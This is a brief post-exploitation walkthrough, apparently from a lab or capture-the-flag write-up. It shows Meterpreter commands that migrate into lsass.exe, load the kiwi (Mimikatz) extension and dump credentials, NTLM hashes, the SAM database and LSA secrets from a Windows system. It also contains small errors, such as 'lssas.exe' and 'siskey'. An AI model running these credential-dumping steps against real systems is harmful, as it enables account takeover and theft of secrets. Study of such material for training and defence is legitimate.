After gaining initial access, we will migrate the current process into lssas.exe. This will give us elevated privileges and make it harder to detect. 
-migrate -N lsass.exe 
Next we will load the kiwi extension
-load kiwi 
We can see the Administrator NTLM hash by using
-creds_all 
    
The creds_all command in the Kiwi module of Meterpreter is used to extract all the credentials from the memory of a running Windows system. It does this by
dumping the contents of the LSASS (Local Security Authority Subsystem Service) process, which is responsible for storing and managing user credentials.

To extract all the users NTLM hash using Kiwi
-lsa_dump_sam 

The lsa_dump_sam command in Mimikatz is used to dump the contents of the SAM (Security Account Manager) database on a Windows system. The SAM database stores 
the hashes of user passwords, as well as other information about user accounts.

To find the siskey, we will run
-lsa_dump_secrets
